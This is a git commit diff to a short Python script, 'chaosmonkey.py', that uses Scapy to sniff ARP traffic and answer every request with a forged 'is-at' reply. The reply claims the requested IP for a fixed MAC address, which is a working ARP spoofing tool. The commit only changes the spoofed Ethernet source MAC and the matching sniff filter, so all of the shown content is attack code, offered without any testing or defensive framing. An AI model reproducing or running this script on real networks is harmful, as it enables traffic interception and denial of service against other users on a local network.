ed2c7eb3adf17543c97076ff4775d9b8eb4f199f
agent389 <agent389@gmail.com>
2017-03-03 11:00:14 -0700

    Update chaosmonkey.py

--- chaosmonkey.py
+++ chaosmonkey.py
@@ -2,12 +2,12 @@ from scapy.all import *
 
 def chaosMonkey(packet):
 	
-	packet2 = Ether(src='34:e6:d7:4f:7e:5c', dst=packet.src)/ARP(psrc=packet[ARP].pdst, pdst=packet[ARP].psrc, hwsrc='34:e6:d7:4f:7e:5c', hwdst=packet[ARP].hwsrc, op= 'is-at')
+	packet2 = Ether(src='34:e6:d7:4f:7e:00', dst=packet.src)/ARP(psrc=packet[ARP].pdst, pdst=packet[ARP].psrc, hwsrc='34:e6:d7:4f:7e:5c', hwdst=packet[ARP].hwsrc, op= 'is-at')
 	packet2.show()
 	sendp(packet2)
 
 
-sniff(filter="arp and ether host not 34:e6:d7:4f:7e:5c", prn=chaosMonkey)
+sniff(filter="arp and ether host not 34:e6:d7:4f:7e:00", prn=chaosMonkey)
 
 
 
